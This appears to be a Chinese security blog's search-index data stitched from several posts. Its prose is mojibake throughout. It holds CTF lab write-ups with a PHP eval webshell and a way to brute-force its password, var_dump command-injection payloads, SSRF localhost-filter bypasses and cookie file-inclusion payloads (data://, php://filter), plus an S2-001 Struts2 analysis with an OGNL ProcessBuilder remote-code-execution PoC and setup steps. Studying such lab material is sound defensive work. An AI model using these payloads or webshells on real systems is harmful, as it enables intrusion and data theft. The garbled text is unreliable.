æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ \u003c?php @eval($_POST['?']);?\u003e æš´ç ´ä¸€å¥è¯æœ¨é©¬çš„è¿æ¥å¯†ç  PHPä¸€å¥è¯å¯ä»¥æ‰§è¡ŒPHPå‘½ä»¤ï¼Œä¸ºäº†æ–¹ä¾¿æš´ç ´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨PHP echoè¾“å‡ºå†…å®¹ï¼Œæ”¹å˜å“åº”åŒ…çš„å¤§å°æ¥åšåŒºåˆ†ã€‚ POST / HTTP/1.1 Host: 118.195.198.108:20001 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 20 cmd=echo 123456789; å¯¹cmdå‚æ•°åŠ æ ‡è®°ï¼Œè¿›è¡Œæš´ç ´ï¼Œè§‚å¯Ÿå“åº”åŒ…å¤§å°å˜åŒ–ï¼Œæœ€åå˜åŒ–çš„å°±æ˜¯å¯†ç ï¼Œå¯†ç ä¸ºpass è¿›è¡Œå‘½ä»¤æ§åˆ¶ï¼Œè¯»å–flag pass=echo `ls`; pass=echo `cat 3daddreEt30Nx.txt`; ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:4:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"5ã€var_dump ğŸ’¡Hint Warning: var_dump() expects at least 1 parameter, 0 given in /var/www/html/index.php(4) : eval()'d code on line 1 \u003c?php #error_reporting(0); $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source (__FILE__); ?\u003e å‘½ä»¤æ³¨å…¥ï¼Œé—­åˆvar_dump POCï¼š /?hello=);echo`ls`;// /?hello=);echo`cat x8kwjkzp1ik.txt`;// ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:5:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"6ã€curl_exec ğŸ’¡Hint \u003c?php error_reporting(0); highlight_file(__FILE__); $url=$_POST['url']; $x=parse_url($url); if($x['scheme']==='http'||$x['scheme']==='https'){ if(!preg_match('/localhost|127.0.0.1/',$x['host'])){ $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); }else{ die('hacker'); } }elseif ($x['scheme']== NULL){ die(''); }else { die('oh no hacker'); } ?\u003e //flag.php url=http://xxxxxx/flag.php è€ƒç‚¹ï¼Œå¯¹localhostã€127.0.0.1çš„ç»•è¿‡ 127.0.0.1 åè¿›åˆ¶æ•´æ•°ï¼šurl=http://2130706433/flag.php åå…­è¿›åˆ¶ï¼šurl=http://0x7F.0.0.1/flag.php å…«è¿›åˆ¶ï¼šurl=http://0177.0.0.1/flag.php åå…­è¿›åˆ¶æ•´æ•°ï¼šurl=http://0x7F000001/flag.php ç¼ºçœæ¨¡å¼ï¼š127.0.0.1å†™æˆ127.1 CIDRï¼šurl=http://127.127.127.127/flag.php url=http://0/flag.php url=http://0.0.0.0/flag.php ç»è¿‡å°è¯•ï¼Œåªæœ‰å¦‚ä¸‹æˆåŠŸç»•è¿‡ï¼Œå…¶ä»–ä¼šé€ æˆ400æŠ¥é”™ url=http://127.127.127.127/flag.php url=http://0x7F000001/flag.php url=http://0.0.0.0/flag.php ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:6:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"7ã€ä½ çœŸçš„ä¼šä½¿ç”¨webshellå—ï¼Ÿ ğŸ’¡Hint ä½ çœŸçš„ä¼šä½¿ç”¨webshellå—ï¼Ÿ \u003c?php @eval($_POST['cmd']);?\u003e ä¸ä¼š ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:7:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"8ã€Hello English ğŸ’¡Hint \u003c?php if( !ini_get('display_errors') ) { ini_set('display_errors', 'On'); } error_reporting(E_ALL); $lan = $_COOKIE['language']; if(!$lan) { @setcookie(\"language\",\"english\"); @include(\"english.php\"); } else { @include($lan.\".php\"); } $x=file_get_contents('index.php'); echo $x; ?\u003e Poc: Cookie: language=data:text/plain,\u003c?php phpinfo()%3b?\u003e Cookie: language=php://filter/read=convert.base64-encode/resource=./flag ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:8:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":null,"content":"AboutMe ","date":"2023-02-18","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"åŸºæœ¬ä¿¡æ¯: Long way to goâ€¦. ä¸€ä¸ªçº ç»“çš„ç½‘ç»œå®‰å…¨å·¥ä½œè€…ï¼› CISPã€ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ Webã€Androidã€é€†å‘ ğŸ“š èµ„æ·±è¯»è€…ã€ğŸ¹ åˆçº§å¼“ç®­æ‰‹ã€ğŸ® è€ç©å®¶ åº§å³é“­ï¼ˆé¸¡æ±¤ï¼‰ï¼š è®©ä¼˜ç§€æˆä¸ºä¸€ç§ä¹ æƒ¯ çƒ­çˆ±ç”Ÿæ´»ï¼Œè®¤çœŸç”Ÿæ´»ï¼Œäº«å—ç”Ÿæ´» é”æ„è¿›å–ï¼Œä½†è¡Œå¥½äº‹ï¼Œè«é—®å‰ç¨‹ ","date":"2023-02-18","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"ç¤¾äº¤å¹³å° Githubï¼šXavierRoot Giteeï¼šXavierRoot CSDNï¼šXavierDarkness å…¬ä¼—å·ï¼š ","date":"2023-02-18","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"å·¥ä½œç»å† å¥‡å®‰ä¿¡ç½‘ç¥ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸ åŒ—äº¬å®‰å¤©ç½‘ç»œå®‰å…¨æŠ€æœ¯æœ‰é™å…¬å¸ æ­å·å®‰ç…œç§‘æŠ€æœ‰é™å…¬å¸ï¼ˆå®ä¹ ï¼‰ ","date":"2023-02-18","objectID":"/about/:4:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"å­¦æ ¡ä¸“ä¸šï¼š å­¦æ ¡ï¼šä¸œåŒ—æ—ä¸šå¤§å­¦ ä¸“ä¸šï¼šä¿¡æ¯ä¸è®¡ç®—ç§‘å­¦ ","date":"2023-02-18","objectID":"/about/:5:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Xavier's friends","date":"2023-02-14","objectID":"/friends/","tags":null,"title":"å‹æƒ…é“¾æ¥","uri":"/friends/"},{"categories":["ä»£ç å®¡è®¡"],"content":"S2-001 æ¼æ´æ˜¯ä¸€ç§å½±å“ Apache Struts 2 æ¡†æ¶çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ã€‚ è¯¥æ¼æ´æ˜¯ç”± Struts 2 æ¡†æ¶ä¸­ä¸æ­£ç¡®çš„è¾“å…¥éªŒè¯å¼•èµ·çš„ï¼Œå®ƒå…è®¸æ”»å‡»è€…é€šè¿‡å‘ Struts 2 åº”ç”¨ç¨‹åºå‘é€ç‰¹åˆ¶çš„ HTTP è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ä¸€ã€ç®€ä»‹ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:0","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 Struts2 Struts2æ˜¯æµè¡Œå’Œæˆç†Ÿçš„åŸºäºMVCè®¾è®¡æ¨¡å¼çš„Webåº”ç”¨ç¨‹åºæ¡†æ¶ã€‚ Struts2ä¸åªæ˜¯Struts1ä¸‹ä¸€ä¸ªç‰ˆæœ¬ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®Œå…¨é‡å†™çš„Strutsæ¶æ„ã€‚ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:1","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 S2-001 Remote code exploit on form validation error S2-001 æ¼æ´æ˜¯ä¸€ç§å½±å“ Apache Struts 2 æ¡†æ¶çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ã€‚ è¯¥æ¼æ´æ˜¯ç”± Struts 2 æ¡†æ¶ä¸­ä¸æ­£ç¡®çš„è¾“å…¥éªŒè¯å¼•èµ·çš„ï¼Œå®ƒå…è®¸æ”»å‡»è€…é€šè¿‡å‘ Struts 2 åº”ç”¨ç¨‹åºå‘é€ç‰¹åˆ¶çš„ HTTP è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ è¿™ä¸ªæ¼æ´çš„æ ¸å¿ƒåœ¨äºï¼Œformçš„éªŒè¯é”™è¯¯æ—¶ï¼Œä¼šè§£æognlè¯­æ³•ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ. poc: %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"pwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} è°ƒè¯•POCï¼š %{1+5} ä¿¡æ¯è·å–ï¼š # tomcat path %{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} # web path %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:2","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"äºŒã€ç¯å¢ƒæ­å»º macOS M2 Java version \"1.8.0_261\" IDEA 2020.2 tomcat 9.0.70 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:0","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 Maven é…ç½® é€šè¿‡Mavenåˆ›å»ºé¡¹ç›®ï¼ŒArchetype,é€‰æ‹©webappã€‚ é«˜çº§è®¾ç½®ä¸‹ï¼Œç„¶ågroupidå’Œartifactidéƒ½å¯ä»¥è‡ªå®šä¹‰ï¼Œä¹‹åFinishã€‚ ç„¶åä¼šè‡ªåŠ¨ä¸‹è½½æ‰€éœ€çš„jaråŒ…ç­‰æ–‡ä»¶è¿›è¡Œæ„å»ºï¼Œåªéœ€è¦é™é™ç­‰å¾…å‡ åˆ†é’Ÿå°±å¥½äº†ã€‚ ç„¶åæ­¤æ—¶åˆ›å»ºå¥½çš„é¡¹ç›®å¦‚å›¾æ‰€ç¤ºã€‚ æ¥ä¸‹æ¥åˆ†åˆ«æ·»åŠ å¹¶é…ç½®Mavençš„pom.xmlï¼ŒTomcatçš„web.xmlï¼ŒStruts2çš„struts.xmlã€‚ 2.1.1 Javaä»£ç  åœ¨mainç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªjavaæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ç½®æˆ‘ä»¬è‡ªå®šä¹‰çš„javaç±»æ–‡ä»¶. åœ¨é‡Œé¢æˆ‘ä»¬åˆ›å»ºè‡ªå®šä¹‰çš„Java Packageã€‚ ç„¶ååœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºLoginActionçš„Javaç±»ï¼Œå†…å®¹ä¸º: package org.example.s2001.action; import com.opensymphony.xwork2.ActionSupport; public class LoginAction extends ActionSupport{ private String username = null; private String password = null; public String getUsername() { return this.username; } public String getPassword() { return this.password; } public void setUsername(String username) { this.username = username; } public void setPassword(String password) { this.password = password; } public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) \u0026\u0026 (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; } } åˆšå¼€å§‹æ·»åŠ äº†ä»£ç ä¹‹åå¯èƒ½ä¼šæœ‰æŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰å¼•å…¥com.opensymphony.xwork2.ActionSupportè¯¥åŒ…. å¯ä»¥å…ˆä¸ç”¨ç®¡ï¼Œå»é…ç½®ä¸€ä¸‹pom.xmlå°±å¥½äº†ã€‚ 2.1.2 pom.xml æ¥ä¸‹æ¥ä¿®æ”¹pom.xmlï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹:(æ·»åŠ åˆ°\u003cdependencies\u003eè¿™ä¸€å¯¹æ ‡ç­¾ä¸­) \u003cdependency\u003e \u003cgroupId\u003eorg.apache.struts\u003c/groupId\u003e \u003cartifactId\u003estruts2-core\u003c/artifactId\u003e \u003cversion\u003e2.0.8\u003c/version\u003e \u003c/dependency\u003e æ·»åŠ è¿™ä¸ªé…ç½®ä¹‹åï¼Œç‚¹å‡»ç•Œé¢ä¸Šå‡ºç°äº†mavenæ›´æ–°å°æŒ‰é’®Mavenä¼šè‡ªåŠ¨å°†å¯¹åº”ç‰ˆæœ¬çš„JaråŒ…ä¸‹è½½å¯¼å…¥ï¼Œä¸éœ€è¦æ‰‹å·¥é…ç½®äº†ã€‚ 2.1.3 web.xml å†ä¿®æ”¹web.xmlï¼Œåœ¨è¿™é‡Œä¸»è¦æ˜¯é…ç½®struts2çš„è¿‡æ»¤å™¨ã€‚ \u003cweb-app\u003e \u003cdisplay-name\u003eS2-001 Example\u003c/display-name\u003e \u003cfilter\u003e \u003cfilter-name\u003estruts2\u003c/filter-name\u003e \u003cfilter-class\u003eorg.apache.struts2.dispatcher.FilterDispatcher\u003c/filter-class\u003e \u003c/filter\u003e \u003cfilter-mapping\u003e \u003cfilter-name\u003estruts2\u003c/filter-name\u003e \u003curl-pattern\u003e/*\u003c/url-pattern\u003e \u003c/filter-mapping\u003e \u003cwelcome-file-list\u003e \u003cwelcome-file\u003eindex.jsp\u003c/welcome-file\u003e \u003c/welcome-file-list\u003e \u003c/web-app\u003e ç„¶åï¼Œåœ¨ webapp ç›®å½•ä¸‹åˆ›å»º\u0026ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶ â€”â€” index.jsp\u0026welcome.jspï¼Œå†…å®¹å¦‚ä¸‹ã€‚ 1ã€index.jsp \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c%@ taglib prefix=\"s\" uri=\"/struts-tags\" %\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eS2-001\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch2\u003eS2-001 Demo\u003c/h2\u003e \u003cp\u003elink: \u003ca href=\"https://cwiki.apache.org/confluence/display/WW/S2-001\"\u003ehttps://cwiki.apache.org/confluence/display/WW/S2-001\u003c/a\u003e\u003c/p\u003e \u003cs:form action=\"login\"\u003e \u003cs:textfield name=\"username\" label=\"username\" /\u003e \u003cs:textfield name=\"password\" label=\"password\" /\u003e \u003cs:submit\u003e\u003c/s:submit\u003e \u003c/s:form\u003e \u003c/body\u003e \u003c/html\u003e 2ã€welcome.jsp \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c%@ taglib prefix=\"s\" uri=\"/struts-tags\" %\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eS2-001\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eHello \u003cs:property value=\"username\"\u003e\u003c/s:property\u003e\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 2.1.4 struts.xml ç„¶ååœ¨ main æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ª resources æ–‡ä»¶å¤¹ï¼Œå†…éƒ¨æ·»åŠ ä¸€ä¸ª struts.xmlï¼Œå†…å®¹ä¸ºï¼š \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\" \"http://struts.apache.org/dtds/struts-2.0.dtd\"\u003e \u003cstruts\u003e \u003cpackage name=\"S2-001\" extends=\"struts-default\"\u003e \u003caction name=\"login\" class=\"com.mengsec.s2001.action.LoginAction\"\u003e \u003cresult name=\"success\"\u003ewelcome.jsp\u003c/result\u003e \u003cresult name=\"error\"\u003eindex.jsp\u003c/result\u003e \u003c/action\u003e \u003c/package\u003e \u003c/struts\u003e è¿™é‡Œé‡åˆ°äº†ä¸ªå°é—®é¢˜ï¼Œå°±æ˜¯æ·»åŠ  struts.xml æ–‡ä»¶æ—¶æ–°å»ºæ–‡ä»¶æ¨¡æ¿é‡Œæ²¡æœ‰å¯¹åº”çš„é…ç½®ï¼Œå¯ä»¥å®‰è£…Struts2æ’ä»¶ 1ã€struts2 æ’ä»¶ è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨é¦–é€‰é¡¹ =\u003e plugins =\u003e æœç´¢struts2 ç„¶åå®‰è£…å°±å¥½äº† æ­¤æ—¶é¡¹ç›®ç›®å½•å¦‚ä¸‹ï¼š ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:1","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 é…ç½®æœåŠ¡å™¨ 2.2.1 å®‰è£…Tomcat æ¥ä¸‹æ¥é…ç½®TomcatæœåŠ¡å™¨ï¼Œåœ¨Macä¸Šçš„è¯ï¼Œç›´æ¥ brew install tomcat@9 å³å¯å®‰è£…tomcat9ã€‚ To have launchd start tomcat now and restart at login: brew services start tomcat Or, if you donâ€™t want/need a background service you can just run: catalina run å¦‚æœæƒ³è¦åå°å¯åŠ¨æœåŠ¡ï¼Œä½¿ç”¨ï¼šbrew services start tomcat ä¸éœ€è¦çš„è¯ç›´æ¥ï¼šcatalina run xavier@Mac S2-001 % brew install tomcat@9 Running `brew update --auto-update`... ==\u003e Auto-updated Homebrew! ........ # ç•¥ ==\u003e Pouring tomcat@9--9.0.70.all.bottle.tar.gz ==\u003e Caveats Configuration files: /opt/homebrew/etc/tomcat@9 tomcat@9 is keg-only, which means it was not symlinked into /opt/homebrew, because this is an alternate version of another formula. If you need to have tomcat@9 first in your PATH, run: echo 'export PATH=\"/opt/homebrew/opt/tomcat@9/bin:$PATH\"' \u003e\u003e ~/.zshrc To restart tomcat@9 after an upgrade: brew services restart tomcat@9 Or, if you don't want/need a background service you can just run: /opt/homebrew/opt/tomcat@9/bin/catalina run ==\u003e Summary ğŸº /opt/homebrew/Cellar/tomcat@9/9.0.70: 628 files, 15.4MB ==\u003e Running `brew cleanup tomcat@9`... Disable this behaviour by setting HOMEBREW_NO_INSTALL_CLEANUP. Hide these hints with HOMEBREW_NO_ENV_HINTS (see `man brew`). xavier@Mac S2-001 % è¿™é‡Œå®‰è£…çš„ç›®å½•ï¼Œåœ¨IDEAä¸­æ‰¾ä¸åˆ°ï¼Œäºæ˜¯æˆ‘æ‰‹åŠ¨å°†å…¶å¤åˆ¶åˆ°äº† xavier@Mac S2-001 % ls /opt/homebrew/etc/tomcat@9 Catalina catalina.properties jaspic-providers.xml logging.properties tomcat-users.xml web.xml catalina.policy cocontext.xml jaspjaspic-providers.xsdrverserver.xml tomcat-utomcat-users.xsd xavier@Mac S2-001 % ls ~/tomcat xavier@Mac S2-001 % cp -r /opt/homebrew/opt/tomcat@9/ ~/tomcat/tomcat@9/ xavier@Mac S2-001 % ls ~/tomcat tomcat@9 2.2.2 æ·»åŠ æœåŠ¡å™¨ æ·»åŠ ä¸€ä¸ªæœ¬åœ°çš„TomcatæœåŠ¡å™¨ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹å›¾: è¿™ä¸ªè·¯å¾„å‚è€ƒå‰é¢å®‰è£…æ—¶æåˆ°çš„å®‰è£…ç›®å½• ç«¯å£æ ¹æ®è‡ªèº«ç¯å¢ƒä¿®æ”¹. ç„¶åå³ä¸‹è§’çš„æç¤ºï¼Œå¯ä»¥ç‚¹å‡»fixæˆ–è€…ç‚¹å‡»Deploymentï¼Œæ·»åŠ ä¸€ä¸ªartifactsã€‚ ç„¶åç‚¹å‡»å·¦ä¸Šè§’çš„ç»¿è‰²ä¸‰è§’å°±å¯ä»¥è¿è¡Œäº†ã€‚ 2.2.3 ä¸€äº›bug æµ‹è¯•æ—¶ï¼Œæœ€å¼€å§‹æ˜¯é€šè¿‡brew install tomcaté»˜è®¤å®‰è£…äº†æœ€æ–°ç‰ˆçš„Tomcat 10.0.x ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬è¿è¡Œç¯å¢ƒæ—¶ä¼šå‡ºç°æŠ¥é”™ã€‚å¤§è‡´æŠ¥é”™å¦‚ä¸‹ï¼š è‡³å°‘æœ‰ä¸€ä¸ªJARè¢«æ‰«æç”¨äºTLDä½†å°šæœªåŒ…å«TLDã€‚ ä¸ºæ­¤è®°å½•å™¨å¯ç”¨è°ƒè¯•æ—¥å¿—è®°å½•ï¼Œä»¥è·å–å·²æ‰«æä½†æœªåœ¨å…¶ä¸­æ‰¾åˆ°TLDçš„å®Œæ•´JARåˆ—è¡¨ã€‚ åœ¨æ‰«ææœŸé—´è·³è¿‡ä¸éœ€è¦çš„JARå¯ä»¥ç¼©çŸ­å¯åŠ¨æ—¶é—´å’ŒJSPç¼–è¯‘æ—¶é—´ã€‚ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:2","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.3 æµ‹è¯•ç¯å¢ƒ åœ¨username çš„è¾“å…¥æ¡†è¾“å…¥ï¼š%{1+1} å¦‚å›¾ï¼Œç¯å¢ƒæ­å»ºæˆåŠŸï¼ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:3","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:0","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 å‰ç½®çŸ¥è¯†ï¼š 3.1.1 S2-001 ç®€ä»‹ è¯¥æ¼æ´æ˜¯ç”±äº Struts 2 æ¡†æ¶å¤„ç† HTTP è¯·æ±‚ä¸­æŸäº›å‚æ•°çš„æ–¹å¼å­˜åœ¨ç¼ºé™·ã€‚ å…·ä½“æ¥è¯´ï¼Œè¯¥æ¡†æ¶æ— æ³•æ­£ç¡®éªŒè¯è¿™äº›å‚æ•°ä¸­çš„ç”¨æˆ·è¾“å…¥ï¼Œä»è€Œå…è®¸æ”»å‡»è€…å°†æ¶æ„è´Ÿè½½æ³¨å…¥åº”ç”¨ç¨‹åºã€‚ æœ‰æ•ˆè´Ÿè½½å¯ä»¥åŒ…å«åº”ç”¨ç¨‹åºå¤„ç†è¯·æ±‚æ—¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„ä»»æ„ä»£ç ã€‚ WebWork 2.1+ å’Œ Struts 2 çš„â€œaltSyntaxâ€åŠŸèƒ½å…è®¸å°† OGNL è¡¨è¾¾å¼æ’å…¥åˆ°æ–‡æœ¬å­—ç¬¦ä¸²ä¸­å¹¶è¿›è¡Œé€’å½’å¤„ç†ã€‚ è¿™å…è®¸æ¶æ„ç”¨æˆ·é€šå¸¸é€šè¿‡ HTML æ–‡æœ¬å­—æ®µæäº¤åŒ…å« OGNL è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœè¡¨å•éªŒè¯å¤±è´¥ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œè¯¥è¡¨è¾¾å¼ã€‚ å¯¹è¯¥æ¼æ´è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¦‚ä¸‹å†…å®¹ï¼š 1. struts2æ˜¯æ€ä¹ˆè¿ä½œçš„ 2. Javaçš„åå°„æœºåˆ¶å’ŒJavaçš„ç±»åŠ è½½æœºåˆ¶å’ŒJavaçš„åŠ¨æ€ä»£ç† 3. Ognlè¡¨è¾¾å¼ 4. IDEAè°ƒè¯•æ–¹æ³• 3.1.2 Struts2 æ¶æ„\u0026è¯·æ±‚å¤„ç†æµç¨‹ æ ¹æ®Struts2çš„æ‰§è¡Œè¿‡ç¨‹è¿›è¡Œåˆ†æï¼š åœ¨è¯¥å›¾ä¸­ï¼Œä¸€å…±ç»™å‡ºäº†å››ç§é¢œè‰²çš„æ ‡è¯†ï¼Œå…¶å¯¹åº”çš„æ„ä¹‰å¦‚ä¸‹ã€‚ Servlet Filters(æ©™è‰²)ï¼šè¿‡æ»¤å™¨ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½è¦ç»è¿‡è¿‡æ»¤å™¨çš„å¤„ç†ã€‚ Struts Core(æµ…è“è‰²)ï¼šStruts2çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ Interceptors(æµ…ç»¿è‰²)ï¼šStruts2çš„æ‹¦æˆªå™¨ã€‚ User created(æµ…é»„è‰²)ï¼šéœ€è¦å¼€å‘äººå‘˜åˆ›å»ºçš„éƒ¨åˆ†ã€‚ HTTPè¯·æ±‚ç»è¿‡ä¸€ç³»åˆ—çš„è¿‡æ»¤å™¨ï¼Œæœ€ååˆ°è¾¾ FilterDispatcher è¿‡æ»¤å™¨ã€‚ FilterDispatcher å°†è¯·æ±‚è½¬å‘ 